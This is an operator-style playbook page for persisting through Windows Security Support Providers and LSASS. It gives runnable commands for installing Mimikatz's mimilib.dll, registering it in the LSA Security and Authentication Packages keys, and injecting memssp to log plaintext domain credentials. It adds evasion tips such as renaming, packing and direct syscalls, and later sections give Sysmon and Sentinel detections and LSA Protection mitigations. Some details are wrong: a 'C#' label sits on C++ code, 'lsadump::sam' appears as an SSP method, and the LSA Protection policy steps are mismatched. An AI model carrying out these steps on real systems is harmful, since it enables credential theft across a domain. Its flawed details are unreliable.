# [PERSIST-BOOT-001]: Abusing Security Support Provider (SSP) for Persistence

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-BOOT-001 |
| **MITRE ATT&CK v18.1** | [T1547.005 - Boot or Logon Autostart Execution: Security Support Provider](https://attack.mitre.org/techniques/T1547/005/) |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | Windows Active Directory, Windows Endpoint |
| **Severity** | **Critical** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Windows Server 2008 R2 - 2025; Windows 7 - 11 (all versions vulnerable unless LSA Protection enabled) |
| **Patched In** | N/A (Requires mitigation via LSA Protection or credential guard) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Security Support Providers (SSPs) are Windows DLL libraries that are loaded into the **Local Security Authority Subsystem Service (LSASS)** process during system startup. SSPs implement the Security Support Provider Interface (SSPI) and handle authentication, encryption, and credential operations. Attackers abuse this mechanism by registering a malicious SSP DLL in the Windows registry, which causes LSASS to load the malicious library with **SYSTEM privileges** on every boot or user authentication event. Once loaded, the malicious SSP gains direct access to plaintext credentials of all users who authenticate to the system, enabling credential harvesting and persistent access.

**Attack Surface:** The attack surface includes:
- Two registry keys that define which SSP DLLs are loaded:
  - `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`
  - `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages`
- The LSASS process memory, which can be patched in-memory to inject SSPs without registry modification
- The Windows System32 folder where SSP DLLs must reside (typically `C:\Windows\System32\`)
- User logon/authentication events that trigger SSP invocation

**Business Impact:** **An attacker who establishes SSP persistence can log all plaintext credentials of domain users authenticating to a compromised system, including administrators and service accounts.** This enables credential harvesting at scale, lateral movement to other systems, privilege escalation to domain admin, and long-term persistence even after system reboots. The attack is particularly dangerous on Domain Controllers, where credentials of all domain users pass through LSASS.

**Technical Context:** SSP credential logging typically occurs within 1-5 seconds of user authentication. Plaintext credentials are written to log files on disk (`kiwissp.log`, `mimilsa.log`) and can be retrieved by an attacker with local file access. The attack detection difficulty is **Medium** – while registry modifications can be detected, attackers may:
- Obfuscate the SSP DLL name to blend with legitimate security packages (Kerberos, NTLM, Schannel)
- Use in-memory injection (memssp) which bypasses disk-based detection
- Modify the SSP to write logs to non-standard locations

### Operational Risk

- **Execution Risk:** **Medium-High** – Requires **Local Administrator or SYSTEM privileges** on the target. Creating the registry entry is straightforward, but the DLL must be properly compiled and placed in System32. Errors in DLL structure can cause LSASS crashes (denial of service).
- **Stealth:** **Medium** – Registry modifications can be detected via Sysmon or Windows Audit. However, if the SSP name matches a legitimate package (e.g., registering as "kerberos.dll" when the legitimate one is "kerberos"), detection requires baseline comparison.
- **Reversibility:** **No** – Once the SSP is registered and a reboot occurs, the DLL is loaded into LSASS memory and credentials are logged indefinitely until the registry entry is deleted and the system is rebooted.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.9 (Windows: Ensure Registry Audit Policy is enabled) | Audit modifications to LSASS-related registry keys to detect SSP registration attempts. |
| **DISA STIG** | WN10-CC-000005 (Credential Guard must be enabled) | Credential Guard protects the LSA process and prevents unauthorized DLL injection into LSASS. |
| **CISA SCuBA** | Windows Security: Kernel DMA Protection | Prevent DMA attacks on LSA memory. |
| **NIST 800-53** | AC-2.1 (User Registration and De-registration), AU-2 (Audit Events), SI-7 (Software, Firmware, and Information Integrity) | Monitor LSASS modifications, audit credential access, and validate software integrity. |
| **GDPR** | Art. 32 (Security of Processing), Art. 33 (Breach Notification) | Credential compromise via SSP represents a data breach requiring notification. |
| **DORA** | Art. 9 (Protection and Prevention), Art. 18 (ICT Service Continuity) | Critical authentication systems must be protected against persistence mechanisms. |
| **NIS2** | Art. 21 (Cybersecurity Risk Management Measures) | Identity and authentication systems must include monitoring and incident response capabilities. |
| **ISO 27001** | A.9.2.2 (User Access Rights Review), A.10.1.1 (Cryptographic Controls), A.12.2.1 (Change Log) | Monitor and log all changes to authentication systems. |
| **ISO 27005** | Risk Scenario: "Unauthorized Access to Encrypted Credentials" | SSP exploitation represents a critical risk to authentication infrastructure. |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Local Administrator or SYSTEM** – Necessary to:
  - Write to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` registry key
  - Place DLL in `C:\Windows\System32\`
  - Access LSASS memory (for in-memory injection methods)

**Required Access:**
- Local file system write access to `C:\Windows\System32\` (for disk-based SSP methods)
- Registry write access to HKLM hive (for registry-based SSP registration)
- If using in-memory injection: Ability to execute code with SYSTEM privilege level (e.g., via `Local System` service account or privileged process)

**Supported Versions:**
- **Windows:** Server 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025
- **Client Windows:** Windows 7, 8, 8.1, 10, 11 (all versions)
- **Excluded/Protected:** Windows systems with LSA Protection enabled or Credential Guard active (Windows Defender Credential Guard is available on Windows 10/Server 2016+)

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (v2.2.0+) – `misc::memssp` and SSP registration
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) – `Install-SSP.ps1` module
- [Empire](https://github.com/BC-SECURITY/Empire) – `persistence/misc/install_ssp` module
- Standard Windows tools: `reg.exe`, `PowerShell`, Visual Studio (for DLL compilation)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Enumerate Existing Security Packages

**Objective:** Identify which SSPs are currently registered to establish baseline and detect anomalies.

**Command (PowerShell):**

```powershell
# Check the Security Packages registry key
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
$secPackages = Get-ItemProperty -Path $regPath -Name "Security Packages" -ErrorAction SilentlyContinue

Write-Host "Registered Security Packages:"
if ($secPackages) {
    $secPackages."Security Packages" -split " " | ForEach-Object { Write-Host "  - $_" }
} else {
    Write-Host "  [Empty or not found]"
}

# Also check OSConfig variant
$osConfigPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig"
$osConfigPackages = Get-ItemProperty -Path $osConfigPath -Name "Security Packages" -ErrorAction SilentlyContinue
if ($osConfigPackages) {
    Write-Host "`nOSConfig Security Packages:"
    $osConfigPackages."Security Packages" -split " " | ForEach-Object { Write-Host "  - $_" }
}
```

**What to Look For:**
- Standard packages (expected): `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg`, `pku2u`
- Suspicious packages: Misspelled names (e.g., `kerb0s` instead of `kerberos`), unknown DLL names, or paths outside System32

**Version Note:** Behavior identical across Windows Server 2008 R2 through 2025.

### Step 2: Check LSA Protection Status

**Objective:** Determine if LSA Protection is enabled (if enabled, in-memory SSP injection will fail).

**Command (PowerShell):**

```powershell
# Check if LSA Protection is enabled
$lsaProtectionPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
$lsaProtectionValue = Get-ItemProperty -Path $lsaProtectionPath -Name "RunAsPPL" -ErrorAction SilentlyContinue

if ($lsaProtectionValue -and $lsaProtectionValue.RunAsPPL -eq 1) {
    Write-Host "✓ LSA Protection is ENABLED (RunAsPPL=1)"
    Write-Host "  In-memory SSP injection will FAIL"
    Write-Host "  Only registry-based persistence (with reboot) will work"
} else {
    Write-Host "✗ LSA Protection is DISABLED"
    Write-Host "  Both registry-based and in-memory SSP injection are viable"
}
```

**What to Look For:**
- `RunAsPPL = 1` → LSA Protection enabled (blocks memssp attacks)
- `RunAsPPL = 0` or absent → LSA Protection disabled (vulnerable to all SSP attacks)

### Step 3: Verify File System Permissions on System32

**Objective:** Confirm that System32 directory allows DLL placement (prerequisite for disk-based SSP).

**Command (PowerShell):**

```powershell
# Check if current user/process can write to System32
$system32Path = "C:\Windows\System32"
$testFile = Join-Path $system32Path "test_write_permissions.txt"

try {
    [System.IO.File]::WriteAllText($testFile, "test")
    Remove-Item $testFile -Force
    Write-Host "✓ Write access to System32: ALLOWED"
} catch {
    Write-Host "✗ Write access to System32: DENIED"
    Write-Host "  Error: $($_.Exception.Message)"
}
```

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Registry-Based SSP Registration (Disk Persistence)

**Supported Versions:** All Windows Server 2008 R2 - 2025; Windows 7 - 11

**Prerequisite:** Attacker has Local Administrator privileges and wants persistence that survives reboots.

#### Step 1: Obtain or Compile Malicious SSP DLL

**Objective:** Acquire or create a DLL that implements the SSP interface and logs credentials.

**Option A: Use Mimikatz's mimilib.dll**

Mimikatz provides `mimilib.dll`, which is a pre-compiled SSP that logs all credentials to `C:\Windows\System32\kiwissp.log`.

**Command (PowerShell - Download from GitHub):**

```powershell
# Download mimilib.dll from Mimikatz releases
# WARNING: This is for authorized security testing only
$mimiURL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"

# Extract and locate mimilib.dll
Invoke-WebRequest -Uri $mimiURL -OutFile "C:\Temp\mimikatz.zip"
Expand-Archive -Path "C:\Temp\mimikatz.zip" -DestinationPath "C:\Temp\mimikatz"

# The DLL should be at: C:\Temp\mimikatz\x64\mimilib.dll (or x86 variant)
Get-Item "C:\Temp\mimikatz\x64\mimilib.dll"
```

**Option B: Compile Custom SSP DLL**

For a custom SSP that logs credentials to a non-standard location:

**C# Code for Custom SSP (SpLsaModeInitialize entry point):**

```cpp
// This is a simplified example of what an SSP DLL would contain
// Real SSP implementation requires Security Support Provider Interface (SSPI) implementation

#include <windows.h>
#include <sspi.h>
#include <stdio.h>

NTSTATUS SEC_ENTRY SpLsaModeInitialize(
    ULONG LsaVersion,
    PULONG NewLsaVersion,
    PSECPKG_FUNCTION_TABLE FunctionTable,
    PLSA_SECPKG_FUNCTION_TABLE LsaFunctionTable
) {
    FILE* logFile = fopen("C:\\Windows\\System32\\custom_ssp.log", "a");
    if (logFile) {
        fprintf(logFile, "[*] SSP Loaded at %s\n", __TIME__);
        fclose(logFile);
    }
    return STATUS_SUCCESS;
}
```

To compile this as a DLL:
```bash
cl.exe /LD SpSSP.cpp /link secur32.lib
```

**What This Means:**
- The DLL must export the `SpLsaModeInitialize` function which LSASS invokes when loading the SSP.
- LSASS will call functions in the SSP whenever authentication occurs, allowing credential interception.

#### Step 2: Place DLL in System32

**Objective:** Copy the compiled or downloaded SSP DLL to `C:\Windows\System32\`.

**Command (PowerShell - requires Admin):**

```powershell
# Copy mimilib.dll to System32
Copy-Item -Path "C:\Temp\mimikatz\x64\mimilib.dll" -Destination "C:\Windows\System32\mimilib.dll" -Force

# Verify placement
Get-Item "C:\Windows\System32\mimilib.dll" | Select-Object FullName, Length
```

**OpSec Note:** To avoid detection, consider:
- Renaming the DLL to match a legitimate package (e.g., `pku2u.dll` duplicate)
- Placing it in an alternate location and using a full path in the registry (not recommended, less reliable)
- Obfuscating the DLL with UPX or other packing tools

#### Step 3: Register SSP in Registry

**Objective:** Add the DLL name to the registry so LSASS loads it on boot.

**Command (PowerShell - requires Admin):**

```powershell
# Get current Security Packages value
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
$currentPackages = (Get-ItemProperty -Path $regPath -Name "Security Packages")."Security Packages"

Write-Host "Current packages: $currentPackages"

# Add mimilib to the list (space-separated)
$newPackages = $currentPackages + " mimilib"

# Set the new value
Set-ItemProperty -Path $regPath -Name "Security Packages" -Value $newPackages -Type String

# Verify
Get-ItemProperty -Path $regPath -Name "Security Packages"
```

**Alternative: Using cmd.exe (Direct Registry Edit):**

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_SZ /d "kerberos msv1_0 schannel wdigest tspkg pku2u mimilib" /f
```

**What This Means:**
- The registry entry now includes `mimilib` in the list of security packages.
- On the next system reboot, LSASS will attempt to load `C:\Windows\System32\mimilib.dll`.

**OpSec & Evasion:**
- Attackers often obfuscate the package name to match legitimate ones (e.g., adding a space before the name or using a similar-sounding name).
- The registry modification (EventID 4657) can be detected if audit logging is enabled.
- Detection difficulty increases if the registry change is made during normal system maintenance windows.

**Troubleshooting:**
- **Error:** `Access Denied` when modifying registry
  - **Cause:** Not running PowerShell as Administrator
  - **Fix:** Right-click PowerShell → **Run as Administrator**
- **Error:** `The system cannot find the registry path specified`
  - **Cause:** Incorrect registry path
  - **Fix:** Verify the path: `HKLM:\SYSTEM\CurrentControlSet\Control\Lsa`

#### Step 4: Reboot and Verify Credential Logging

**Objective:** Trigger LSASS to load the malicious SSP and verify credentials are being logged.

**Command (PowerShell - requires Admin):**

```powershell
# Reboot the system
Restart-Computer -Force

# After reboot, check if credential log file was created
# (This command runs on the system after reboot)
Get-Item "C:\Windows\System32\kiwissp.log" | Select-Object FullName, Length, LastWriteTime

# View log contents (contains plaintext credentials!)
Get-Content "C:\Windows\System32\kiwissp.log"
```

**Expected Output:**
```
Domain\Username
Password123!
```

**What This Means:**
- Every domain user who authenticates to the system will have their credentials logged in plaintext.
- The attacker can retrieve this file remotely via SMB, WMI, or any other lateral movement technique.

---

### METHOD 2: In-Memory SSP Injection (Mimikatz memssp)

**Supported Versions:** All Windows Server versions without LSA Protection; Windows 7 - 10 (Windows 11 increasingly uses LSA Protection by default)

**Prerequisite:** Attacker has obtained code execution as **SYSTEM privilege level** and wants to avoid disk writes.

#### Step 1: Obtain Mimikatz

**Objective:** Download or compile Mimikatz with memssp capability.

**Command (PowerShell):**

```powershell
# Download Mimikatz release
$mimiURL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
Invoke-WebRequest -Uri $mimiURL -OutFile "C:\Temp\mimikatz.zip"
Expand-Archive -Path "C:\Temp\mimikatz.zip" -DestinationPath "C:\Temp\mimikatz"

# Use x64 variant on 64-bit systems
$mimiPath = "C:\Temp\mimikatz\x64\mimikatz.exe"
```

#### Step 2: Execute memssp Command

**Objective:** Inject SSP into LSASS memory without disk persistence.

**Command (PowerShell - Run Mimikatz.exe):**

```powershell
# Using Mimikatz interactively
C:\Temp\mimikatz\x64\mimikatz.exe

# Inside Mimikatz prompt:
privilege::debug
misc::memssp
exit
```

**Alternative: Invoke-Mimikatz (PowerShell Module):**

```powershell
# Using Invoke-Mimikatz from PowerSploit
Import-Module "C:\PowerSploit\Invoke-Mimikatz.ps1"

Invoke-Mimikatz -Command "privilege::debug" "misc::memssp" "exit"
```

**What This Means:**
- `privilege::debug` – Enables SeDebugPrivilege, allowing Mimikatz to access LSASS memory
- `misc::memssp` – Injects an SSP into LSASS memory, creating `C:\Windows\System32\mimilsa.log`

#### Step 3: Verify In-Memory SSP Is Active

**Objective:** Confirm that the SSP is loaded and logging credentials.

**Command (PowerShell):**

```powershell
# Check if mimilsa.log file was created
Get-Item "C:\Windows\System32\mimilsa.log" -ErrorAction SilentlyContinue

# View contents (requires file access)
Get-Content "C:\Windows\System32\mimilsa.log"
```

**OpSec & Evasion:**
- This method avoids registry modification, reducing Event Log detection.
- The SSP is only persistent for the current boot cycle; after reboot, it is lost (unless the registry is also modified).
- Some EDR solutions detect LSASS memory injection patterns, but evasion is possible by:
  - Timing the injection during system startup to blend with legitimate SSP loading
  - Using direct syscalls or other low-level techniques to bypass detection hooks

**Troubleshooting:**
- **Error:** `privilege::debug` fails or returns error
  - **Cause:** Running Mimikatz without SYSTEM privileges
  - **Fix:** Run as Administrator (or SYSTEM account) via `runas /user:SYSTEM cmd.exe` or service account execution
- **Error:** `mimilsa.log` not created
  - **Cause:** SSP injection failed (possibly due to LSA Protection)
  - **Fix:** Check if LSA Protection is enabled using Method 1, Step 2

---

### METHOD 3: Authentication Package Abuse (LSASS DLL Loading via LSA Extensions)

**Supported Versions:** All Windows Server 2008 R2 - 2025

**Prerequisite:** Attacker wants to abuse related registry keys that are less commonly monitored than Security Packages.

#### Step 1: Identify Alternative LSA Configuration Keys

**Objective:** Discover registry keys that trigger LSASS DLL loading.

**Command (PowerShell):**

```powershell
# List all LSA-related registry keys that load DLLs
$lsaPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"

Get-Item -Path $lsaPath | Get-ItemProperty | Format-Table -AutoSize

# Focus on keys that reference DLLs:
# - Authentication Packages (similar to Security Packages)
# - Notification Packages (alternative persistence mechanism)
# - LsaExtensionConfig (LSA extensions)
```

**What to Look For:**
- `Authentication Packages` – Similar to Security Packages, loaded during authentication
- `Notification Packages` – Invoked when user logs in/off
- `LsaExtensionConfig\LsaSrv` – LSA server extensions

#### Step 2: Register Malicious DLL in Alternative Key

**Objective:** Use a less-monitored registry key to persist the SSP.

**Command (PowerShell - requires Admin):**

```powershell
# Add to Authentication Packages (alternative to Security Packages)
$authPackagesPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
$currentAuthPackages = (Get-ItemProperty -Path $authPackagesPath -Name "Authentication Packages" -ErrorAction SilentlyContinue)."Authentication Packages"

if ($currentAuthPackages) {
    $newAuthPackages = $currentAuthPackages + " mimilib"
} else {
    $newAuthPackages = "msv1_0 mimilib"
}

Set-ItemProperty -Path $authPackagesPath -Name "Authentication Packages" -Value $newAuthPackages -Type String

# Verify
Get-ItemProperty -Path $authPackagesPath -Name "Authentication Packages"
```

#### Step 3: Establish Persistence with Reboot

**Objective:** System reboot triggers loading of the malicious DLL.

**Command (PowerShell - requires Admin):**

```powershell
# Schedule reboot for maintenance window to avoid suspicion
$rebootTime = (Get-Date).AddHours(2)
shutdown /r /t $([int]($rebootTime - (Get-Date)).TotalSeconds)

# Or force immediate reboot
Restart-Computer -Force
```

---

## 5. ATTACK SIMULATION & VERIFICATION

### Manual Test: Registry-Based SSP Persistence

**Test Environment:** Windows Server 2019 or 2022 with Local Administrator access.

**Test Steps:**

1. **Create a test SSP DLL** (or use mimilib.dll)
2. **Place in System32:** `Copy-Item mimilib.dll C:\Windows\System32\`
3. **Modify registry:** `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "Security Packages" -Value "kerberos msv1_0 schannel wdigest tspkg pku2u mimilib"`
4. **Reboot system:** `Restart-Computer -Force`
5. **Verify credential logging:**
   ```powershell
   # After reboot, authenticate as a domain user
   net use \\server\share /user:domain\testuser password
   
   # Check log file
   Get-Content C:\Windows\System32\kiwissp.log
   ```

**Expected Output:**
- Log file contains plaintext credentials of authenticated users

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

#### Atomic Test: Add Security Support Provider

- **Atomic Test ID:** T1547.005-1
- **Test Name:** Add Security Support Provider to Registry
- **Description:** Adds a registry entry pointing to a malicious SSP DLL in the Security Packages registry key
- **Supported Versions:** Windows Server 2008 R2+, Windows 7+
- **Command:**
  ```powershell
  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_SZ /d "kerberos msv1_0 schannel wdigest tspkg pku2u #{ssp_dll_name}" /f
  ```
- **Cleanup Command:**
  ```powershell
  reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /f
  ```

**Reference:** [Atomic Red Team Library - T1547.005](https://www.atomicredteam.io/atomic-red-team/atomics/T1547.005)

---

## 7. TOOLS & COMMANDS REFERENCE

### Mimikatz

**Version:** 2.2.0+
**Minimum Version:** 2.0.0
**Supported Platforms:** Windows (both x86 and x64)

**Installation:**
```powershell
# Download from GitHub
$url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
Invoke-WebRequest -Uri $url -OutFile "mimikatz.zip"
Expand-Archive -Path "mimikatz.zip" -DestinationPath "."
```

**Usage (SSP Methods):**
```powershell
# Registry-based SSP registration
mimikatz.exe "lsadump::sam" "exit"

# In-memory SSP injection
mimikatz.exe "privilege::debug" "misc::memssp" "exit"
```

### PowerSploit

**Version:** Latest from GitHub
**Supported Platforms:** Windows PowerShell 2.0+

**Installation:**
```powershell
# Clone or download from GitHub
git clone https://github.com/PowerShellMafia/PowerSploit.git
Import-Module PowerSploit\Persistence\Install-SSP.ps1
```

**Usage:**
```powershell
Install-SSP -DllPath "C:\Path\To\mimilib.dll"
```

### Empire

**Version:** Latest
**Supported Platforms:** Windows (Windows agents)

**Installation:**
```bash
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
./setup/install.sh
```

**Usage:**
```
usemodule persistence/windows/misc/install_ssp
set DllPath C:\Path\To\mimilib.dll
run
```

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4657** (A registry value was modified)

- **Log Source:** Security
- **Trigger:** Any modification to the following registry paths:
  - `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`
  - `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages`
  - `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages`
  - `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages`

**Key Fields in Event 4657:**
- **Subject:** User and logon session that made the change (e.g., SYSTEM)
- **Object Name:** Registry path that was modified
- **Object Value Name:** The specific registry value (e.g., "Security Packages")
- **Operation Type:** "Value modified", "Value created"
- **Old Value:** Previous registry value
- **New Value:** New registry value (attacker-added SSP name)

### Manual Configuration Steps (Group Policy)

**For Domain-Joined Systems:**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
3. Enable: **Audit Registry**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**For Standalone Systems:**

1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
3. Enable: **Audit Registry** to **Success, Failure**
4. On the **Lsa** registry key specifically, right-click → **Properties** → **Security** → **Advanced** → **Auditing**
5. Add an audit rule for "Modify" permission on "Everyone"

### Sysmon Detection Rule (Event ID 13: Registry Set Value)

```xml
<Rule groupRelation="and">
  <RegistryEvent onmatch="include">
    <TargetObject condition="contains any">
      HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages;
      HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages;
      HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages;
      HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages
    </TargetObject>
    <EventType>SetValue</EventType>
  </RegistryEvent>
</Rule>
```

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server/Endpoint

**Sysmon Configuration Snippet:**

```xml
<!-- Detect unsigned or anomalous DLLs loaded into LSASS -->
<ImageLoad onmatch="exclude">
  <Image>C:\Windows\System32\lsass.exe</Image>
  <ImageLoaded condition="is">C:\Windows\System32\kerberos.dll</ImageLoaded>
  <ImageLoaded condition="is">C:\Windows\System32\msv1_0.dll</ImageLoaded>
  <ImageLoaded condition="is">C:\Windows\System32\schannel.dll</ImageLoaded>
  <ImageLoaded condition="is">C:\Windows\System32\wdigest.dll</ImageLoaded>
  <ImageLoaded condition="is">C:\Windows\System32\tspkg.dll</ImageLoaded>
  <ImageLoaded condition="is">C:\Windows\System32\pku2u.dll</ImageLoaded>
  <ImageLoaded condition="is">C:\Windows\System32\cryptdll.dll</ImageLoaded>
</ImageLoad>

<!-- Alert on any OTHER DLL loaded into LSASS -->
<ImageLoad onmatch="include">
  <Image>C:\Windows\System32\lsass.exe</Image>
</ImageLoad>
```

### Manual Configuration Steps

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[System[EventID=13]]" -MaxEvents 10
   ```

---

## 10. MICROSOFT SENTINEL DETECTION

### Query 1: Registry Modification to LSA Security Packages

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, RegistryKeyPath, RegistryValueName
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To:** All Windows Server versions

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4657  // Registry value was modified
| where ObjectName has_any (
    "\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages",
    "\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages",
    "\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Authentication Packages"
  )
| where OperationType in ("%%1907", "%%1906")  // Value modified or created
| extend NewValue = split(NewValue, " ")
| extend StandardPackages = dynamic(["kerberos", "msv1_0", "schannel", "wdigest", "tspkg", "pku2u"])
| extend SuspiciousPackages = NewValue[~StandardPackages]
| where array_length(SuspiciousPackages) > 0
| project 
    TimeGenerated,
    Computer,
    SubjectUserName,
    ObjectName,
    NewValue,
    SuspiciousPackages,
    SourceIP = IpAddress
| sort by TimeGenerated desc
```

**What This Detects:**
- Additions to the Security Packages registry key that don't match standard Windows packages
- Any new SSP registration, even if obfuscated

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Registry Modification to LSA Security Packages`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Threshold: `> 0`
7. Click **Review + create** → **Create**

---

### Query 2: Unusual DLL Load into LSASS Process

**Rule Configuration:**
- **Required Table:** Sysmon Event 7 (ImageLoad)
- **Required Fields:** TargetImage, ImageLoaded, SignatureStatus
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To:** All Windows with Sysmon enabled

**KQL Query:**

```kusto
Event
| where Source == "Microsoft-Windows-Sysmon/Operational" and EventID == 7
| parse EventData with * '<Data Name="TargetImage">' TargetImage '</Data>' * '<Data Name="ImageLoaded">' ImageLoaded '</Data>' * '<Data Name="SignatureStatus">' SignatureStatus '</Data>' *
| where TargetImage has "lsass.exe"
| where not (
    ImageLoaded has_any (
      "C:\\Windows\\System32\\kerberos.dll",
      "C:\\Windows\\System32\\msv1_0.dll",
      "C:\\Windows\\System32\\schannel.dll",
      "C:\\Windows\\System32\\wdigest.dll",
      "C:\\Windows\\System32\\tspkg.dll",
      "C:\\Windows\\System32\\pku2u.dll",
      "C:\\Windows\\System32\\cryptdll.dll",
      "C:\\Windows\\System32\\spnego.dll"
    )
  )
| project TimeGenerated, Computer, ImageLoaded, SignatureStatus
| sort by TimeGenerated desc
```

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### Action 1: Enable LSA Protection (Credential Guard)

**Objective:** Prevent unauthorized DLL injection into LSASS by enabling Protected Process Light (PPL).

**Applies To Versions:** Windows Server 2016+ (recommended on 2012 R2, limited support on 2008 R2)

**Manual Steps (PowerShell - Server 2016+):**

```powershell
# Enable LSA Protection via registry
$lsaPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
Set-ItemProperty -Path $lsaPath -Name "RunAsPPL" -Value 1 -Type DWord

# Verify
Get-ItemProperty -Path $lsaPath -Name "RunAsPPL"

# Reboot for changes to take effect
Restart-Computer -Force
```

**Manual Steps (Server 2012 R2 - Limited Support):**

```powershell
# Server 2012 R2 requires additional steps:
# 1. Install KB3038261 or later patch
# 2. Enable via registry
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1 -Type DWord
Restart-Computer -Force
```

**Manual Steps (Group Policy - Domain-Joined Systems):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
3. Find: **System cryptography: Use FIPS compliant algorithms for encryption, hashing, and signing**
4. OR use newer policy: **System objects: Protect system objects with strong name authentication**
5. Enable: **Yes** or **Enabled**
6. Run `gpupdate /force` on target machines

#### Action 2: Monitor and Alert on Registry Modifications to LSA Keys

**Objective:** Detect SSP registration attempts via Event Log monitoring.

**Manual Steps (Enable Event ID 4657 Auditing):**

1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
3. Enable: **Audit Registry** to **Success, Failure**
4. Specifically audit the **Lsa** registry key:
   - Navigate to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`
   - Right-click → **Permissions** → **Advanced**
   - Go to **Auditing** tab
   - Add: Everyone, Full Control, Modify rights
5. Run `auditpol /set /subcategory:"Registry" /success:enable /failure:enable` (command line alternative)

#### Action 3: Restrict Registry Access to LSA Configuration Keys

**Objective:** Prevent unauthorized modifications to Security Packages registry.

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Registry**
3. Right-click **Registry** → **Add Object** → **Add Registry**
4. Browse to: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`
5. Set **Permissions:**
   - **SYSTEM:** Full Control
   - **Administrators:** Full Control (or Limited Write)
   - **Everyone else:** Deny (or Read-Only)
6. Apply policy: `gpupdate /force`

**Manual Steps (PowerShell - Direct Registry ACL Modification):**

```powershell
